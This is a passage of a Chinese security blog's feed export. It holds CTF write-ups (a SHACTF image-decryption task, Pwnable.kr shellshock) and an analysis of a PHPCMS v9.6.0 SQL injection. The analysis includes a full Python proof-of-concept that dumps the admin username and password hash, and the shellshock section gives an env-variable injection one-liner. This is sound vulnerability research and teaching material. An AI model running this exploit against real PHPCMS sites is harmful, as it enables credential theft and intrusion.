class="keyword">def</span> <span class="title">encrypt_image</span><span class="params">(img)</span>:</span></div><div class="line">    data = open(img, <span class="string">'r'</span>).read()</div><div class="line">    encrypted_img = encrypt(data, sys.argv[<span class="number">1</span>])</div><div class="line">    blurred_img = open(<span class="string">'/tmp/sha.png'</span>, <span class="string">'r'</span>).read()</div><div class="line">    stat = os.stat(img)</div><div class="line">    <span class="keyword">with</span> open(img, <span class="string">'r+'</span>) <span class="keyword">as</span> of:</div><div class="line">        of.write(<span class="string">'\0'</span> * stat.st_size)</div><div class="line">        of.flush()</div><div class="line">    open(img, <span class="string">'w'</span>).write(blurred_img + <span class="string">"\n"</span> + encrypted_img)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s &lt;pass&gt;"</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        encrypt_images()</div></pre></td></tr></table></figure></p>
<p>可以看出这是一个加密脚本。其调用过程如下：</p>
<ol>
<li>调用find_images()找到png文件，</li>
<li>先根据png文件生成一张“模糊”的图片并保存到sha.png中，</li>
<li>接着调用encrypt_image(img)。<ol>
<li>先把原图片进行了一次encrypt()加密，得到encrypted_img</li>
<li>读取之前生成的sha.png文件，作为blurred_img</li>
<li>将blurred_img + “\n” + encrypted_img 的内容写入图片文件。</li>
</ol>
</li>
</ol>
<p>用十六进制编辑器打开可以验证。图片中<code>0A</code>即为10，这是”\n”的的十六进制表示。之前的数据即为blurred_img，之后的数据即为encrypted_img。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/4.png?raw=true" alt=""></p>
<p>接下来我们看看怎么进行encrypt()函数。encrypt()加密使用了AES加密。要对密文解密的话，我们可以调用decrypt(m, p, i)，这需要三个参数，m即加密后的数据，p即密钥，i即偏移量。</p>
<p>m是加密后的数据，直接打开图片进行提取就行。</p>
<p>p是密钥。在运行脚本是通过命令行参数读入。结合之前得到的<code>.bash_history</code>中的<code>chmod +x ...
./... Hb8jnSKzaNQr5f7p</code>，我们推测<code>Hb8jnSKzaNQr5f7p</code>即为密钥。</p>
<p>i是偏移量，通过get_iv()生成。其中使用int(time())来作为生成伪随机数的种子。图片的修改时间是可以获得的。所以i，我们也得到了。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_images</span><span class="params">()</span>:</span></div><div class="line">    i = []</div><div class="line">    <span class="keyword">for</span> r, d, f <span class="keyword">in</span> os.walk(<span class="string">"."</span>):</div><div class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> f:</div><div class="line">            <span class="keyword">if</span> g.endswith(<span class="string">".png"</span>):</div><div class="line">                i.append((os.path.join(r, g)))</div><div class="line">    <span class="keyword">return</span> i</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_iv</span><span class="params">(time)</span>:</span></div><div class="line">    iv = <span class="string">""</span></div><div class="line">    random.seed(int(time))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</div><div class="line">        iv += random.choice(string.letters + string.digits)</div><div class="line">    <span class="keyword">return</span> iv</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(m, p, i)</span>:</span></div><div class="line">    aes = AES.new(p, AES.MODE_CFB, i)</div><div class="line">    <span class="keyword">return</span> aes.decrypt(base64.b64decode(m))</div><div class="line"></div><div class="line"></div><div class="line">p = <span class="string">"Hb8jnSKzaNQr5f7p"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> find_images():</div><div class="line">	new_img_name = i[len(<span class="string">"./Pictures/"</span>):<span class="number">-4</span>]</div><div class="line">	old_img = open(i, <span class="string">'r'</span>).read()</div><div class="line"></div><div class="line">	data = old_img[old_img.find(<span class="string">"IEND"</span>)+<span class="number">9</span>:]</div><div class="line">	print(data[<span class="number">0</span>:<span class="number">5</span>])</div><div class="line">	old_img_time = os.stat(i).st_mtime</div><div class="line">	new_img_name = str(old_img_time) + new_img_name</div><div class="line"></div><div class="line">	iv = get_iv(old_img_time)</div><div class="line">	<span class="comment"># print(iv)</span></div><div class="line">	new_img = open(new_img_name,<span class="string">"wb"</span>)</div><div class="line"></div><div class="line">	new_img.write(decrypt(data,p,iv))</div><div class="line">	new_img.close()</div></pre></td></tr></table></figure></p>
<p>其中<code>old_img_time = os.stat(i).st_mtime</code>，是为了获得图片的修改时间。</p>
<p>运行后会得到一些图片。其中一张如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/5.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;ed70550afe72e2a8fed444c5850d6f9b&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SHACTF-2017-WannaFly-writeup。虽然只有100分，不过比国内一些比赛的题目质量好多了。&lt;/p&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>PHPCMS v9.6.0 wap模块sql注入漏洞分析</title>
    <link href="http://yoursite.com/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/</id>
    <published>2017-08-04T06:19:51.000Z</published>
    <updated>2017-08-04T07:50:24.490Z</updated>
    
    <content type="html"><![CDATA[<p>PHPCMS v9.6.0 wap模块sql注入漏洞分析<br><a id="more"></a></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在/phpcms/modules/content/down.php中，约莫第11行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">unset</span>($i,$m,$f);</div><div class="line">	parse_str($a_k);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</div><div class="line">	$allow_visitor = <span class="number">1</span>;</div><div class="line">	$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</div><div class="line">	$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</div><div class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</div><div class="line">	$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</div></pre></td></tr></table></figure></p>
<p>首先，通过GET方法得到参数<code>$a_k</code>。在经过<code>sys_auth</code>解密(里面有个DECODE)后，对<code>$a_k</code>进行了一次parse_str($a_k)，parse_str()会把字符串解析到对ing的变量中。在经过解析后，通过语句<code>$rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>将变量id带入查询。所以目标是寻找一个能加密的地方，并且能够回显给我们，这样就能构造参数$a_k，并造成注入。</p>
<p>在 /phpcms/modules/attachment/attachments.php 中，约莫第239行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</div><div class="line">		$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</div><div class="line">		$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</div><div class="line">		$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</div><div class="line">		$json_str = json_encode($arr);</div><div class="line">		$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</div><div class="line">		$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</div><div class="line">		<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</div><div class="line">			param::set_cookie(<span class="string">'att_json'</span>,$json_str);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>通过GET方法得到参数$arr[‘src’]，先经过<code>safe_replace()</code>过滤。我们先看一下<code>safe_replace()</code>函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>将<code>%27</code>等关键字过滤。但是利用“*”会被直接过滤为空这点，假设传入的$string为<code>%2*7</code>,则在替换后，会变成<code>%27</code>，从而获得单引号，其余可类似绕过。</p>
<p>接下来继续运行。若不满足条件，会进入set_cookie()函数，具体如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</div><div class="line">	$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</div><div class="line">	$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</div><div class="line">	$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</div><div class="line">	$_COOKIE[$var] = $value;</div><div class="line">	<span class="keyword">if</span> (is_array($value)) &#123;</div><div class="line">		<span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</div><div class="line">			setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中，会将传入的参数进行一次加密sys_auth($value, ‘ENCODE’)，这正好满足我们前面的需求。</p>
<p>为了能访问到swfupload_json()，我们需要一个cookie。这样在访问时才不会直接跳转到登陆也main。接下来就是寻找能够给我们提供这次setcookie机会的接口。比如说wap模块。<br>在 /phpcms/modules/wap/index.php 中，约莫第6行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		</div><div class="line">	<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</div><div class="line">	<span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</div><div class="line">	param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);</div></pre></td></tr></table></figure></p>
<p>通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ul>
<li>访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。</li>
<li>将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】</li>
<li>获取返回头的set—Cookie字段，此即为加密后的payload</li>
<li>访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。</li>
</ul>
<h2 id="cmsPoc"><a href="#cmsPoc" class="headerlink" title="cmsPoc"></a><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a></h2><p>开源CMS渗透测试框架 <a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a>中已集成了利用脚本 v960_sqlinject_getpasswd.py。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> target</div><div class="line"><span class="keyword">import</span> requests,sys,urllib</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		url = target.url</div><div class="line">		sqli_prefix = <span class="string">'%*27an*d%20'</span></div><div class="line">		sqli_info = <span class="string">'updatexml(1,concat(1,(user())),1)'</span></div><div class="line">		sqli_password1 = <span class="string">'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from '</span></div><div class="line">		sqli_password2 = <span class="string">'_admin limit 0,1)),1)'</span></div><div class="line">		sqli_padding = <span class="string">'%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'</span></div><div class="line"></div><div class="line">		step1 = url + <span class="string">'/index.php?m=wap&amp;a=index&amp;siteid=1'</span></div><div class="line">		r = requests.get(step1)</div><div class="line">		post = &#123;<span class="string">"userid_flash"</span>:r.cookies[<span class="string">"GPYAh_siteid"</span>]&#125;</div><div class="line">		print(<span class="string">'[+] Get Cookie : '</span> + r.cookies[<span class="string">"GPYAh_siteid"</span>])</div><div class="line"></div><div class="line">		step2  = url + <span class="string">"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id="</span> + sqli_prefix + sqli_info+ sqli_padding</div><div class="line">		r = requests.post(step2,data=post)</div><div class="line">		sqli_payload = r.cookies[<span class="string">"GPYAh_att_json"</span>]</div><div class="line">		print(<span class="string">'[+] Get SQLi Payload : '</span> + sqli_payload)</div><div class="line"></div><div class="line">		step3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</div><div class="line">		html = requests.get(step3).text</div><div class="line"></div><div class="line">		db_start = html.find(<span class="string">"SELECT * FROM `"</span>) + len(<span class="string">"SELECT * FROM `"</span>)</div><div class="line">		db_end = html.find(<span class="string">"`.`"</span>)</div><div class="line">		Database = html[db_start:db_end]</div><div class="line">		print(<span class="string">"[+] Get Database Name: "</span>+ Database)</div><div class="line"></div><div class="line">		tableprefix_start = html.find(<span class="string">"`.`"</span>) + len(<span class="string">"`.`"</span>)</div><div class="line">		tableprefix_end = html.find(<span class="string">"_download_data"</span>)</div><div class="line">		tableprefix = html[tableprefix_start:tableprefix_end]</div><div class="line">		print(<span class="string">"[+] Get Table Prefix: "</span>+ tableprefix)</div><div class="line"></div><div class="line">		startIndex = html.find(<span class="string">"XPATH syntax error: '"</span>) + len(<span class="string">"XPATH syntax error: '"</span>)</div><div class="line">		endIndex = html.find(<span class="string">"' &lt;br /&gt; &lt;b&gt;MySQL Errno"</span>)</div><div class="line">		database_user = html[startIndex:endIndex]</div><div class="line">		print(<span class="string">"[+] Get Database-user Information : "</span> + database_user)</div><div class="line"></div><div class="line">		step4  = url + <span class="string">"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id="</span> + sqli_prefix + sqli_password1+ tableprefix + sqli_password2 + sqli_padding</div><div class="line">		r = requests.post(step4,data=post)</div><div class="line">		sqli_payload = r.cookies[<span class="string">"GPYAh_att_json"</span>]</div><div class="line"></div><div class="line">		setp5 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</div><div class="line">		html = requests.get(setp5).text</div><div class="line">		startIndex = html.find(<span class="string">"XPATH syntax error: '"</span>) + len(<span class="string">"XPATH syntax error: '"</span>)</div><div class="line">		endIndex = html.find(<span class="string">"' &lt;br /&gt; &lt;b&gt;MySQL Errno"</span>)</div><div class="line">		admin_passwd = html[startIndex:endIndex]</div><div class="line">		print(<span class="string">"[+] Get User Passwd: "</span> + admin_passwd)</div><div class="line"></div><div class="line">		print(<span class="string">"\033[33m[*] Complete this task: &#123;&#125; \033[0m"</span>.format(target.url))</div><div class="line"></div><div class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</div><div class="line"></div><div class="line">		print(<span class="string">"\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"</span>)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/cmsPoc/blob/master/tty.gif?raw=true" alt=""></p>
<p>本文收录于：<a href="https://chybeta.gitbooks.io/vuln-time/content/weban-quan/sqlzhu-ru/phpcms-v960-wapmo-kuai-zhu-ru.html" target="_blank" rel="external">【gitbook:Vuln-Time】</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PHPCMS v9.6.0 wap模块sql注入漏洞分析&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:shellshock</title>
    <link href="http://yoursite.com/2017/08/01/Pwnable-kr-shellshock/"/>
    <id>http://yoursite.com/2017/08/01/Pwnable-kr-shellshock/</id>
    <published>2017-08-01T13:00:26.000Z</published>
    <updated>2017-08-01T13:22:02.121Z</updated>
    
    <content type="html"><![CDATA[<p>bash破壳漏洞应用。<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	setresuid(getegid(), getegid(), getegid());</div><div class="line">	setresgid(getegid(), getegid(), getegid());</div><div class="line">	system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>有名的bash破壳漏洞。所以这里不展开了。直接给出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; /bin/cat flag&apos; ./shellshock</div><div class="line">only if I knew CVE-2014-6271 ten years ago..!!</div><div class="line">Segmentation fault</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;bash破壳漏洞应用。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:bin" scheme="http://yoursite.com/categories/writeup-bin/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:mistake</title>
    <link href="http://yoursite.com/2017/08/01/Pwnable-kr-mistake/"/>
    <id>http://yoursite.com/2017/08/01/Pwnable-kr-mistake/</id>
    <published>2017-08-01T12:43:35.000Z</published>
    <updated>2017-08-01T12:54:12.074Z</updated>
    
    <content type="html"><![CDATA[<p>操作符优先级问题。c语言中<code>=</code>优先级为14，而<code>&lt;</code>优先级为6。<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</div><div class="line">		s[i] ^= XORKEY;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">int</span> fd;</div><div class="line">	<span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</div><div class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</div><div 